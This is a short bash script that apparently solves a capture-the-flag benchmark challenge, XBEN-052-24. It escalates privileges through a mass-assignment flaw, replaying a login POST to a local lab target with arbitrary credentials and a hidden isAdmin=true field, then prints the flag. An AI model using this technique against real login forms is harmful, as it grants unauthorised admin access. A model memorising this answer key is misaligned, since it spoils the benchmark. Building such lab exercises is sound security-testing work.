#!/usr/bin/env bash
# XBEN-052-24 — mass-assignment / hidden-field privesc. Proxy-mode twin. The
# login handler trusts an isAdmin field the form never shows; sending it true
# authenticates as an admin, and the flag is returned.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben052p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/index.php' --set 'form.username=anyone' --set 'form.password=anything' \
  --set 'form.isAdmin=true' >/dev/null
print_flag
